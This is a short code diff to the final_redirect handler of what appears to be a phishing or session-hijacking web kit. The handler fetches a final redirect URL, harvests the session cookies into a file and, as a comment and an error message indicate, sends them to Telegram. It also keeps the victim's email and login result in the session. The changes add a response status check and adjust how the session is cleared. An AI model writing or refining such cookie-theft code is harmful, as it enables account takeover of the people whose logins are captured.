@@ -1248,6 +1248,9 @@ async def final_redirect():
                 })
                 # Request the final redirect URL to capture response cookies
                 resp = session_obj.get(final_redirect_url, allow_redirects=True, timeout=10)
+                # Use resp to ensure the variable is accessed and to detect non-OK responses
+                if not resp.ok:
+                    print(f"Warning: fetching {final_redirect_url} returned status {resp.status_code}")
                 for c in session_obj.cookies:
                     cookies_data["cookies"].append({
                         "name": c.name,
@@ -1281,7 +1284,9 @@ async def final_redirect():
                 print(f"Error preparing/sending cookies file: {e}")
 
         # Clear session and return redirect URL (frontend should perform client redirect)
-        session.clear()
+        #session.clear() #clear session after sending cookies to telegram
+        session.pop('email', None)
+        session.pop('login_result', None)
         return jsonify({"status": "success", "redirect_url": final_redirect_url})
 
     except Exception as e:
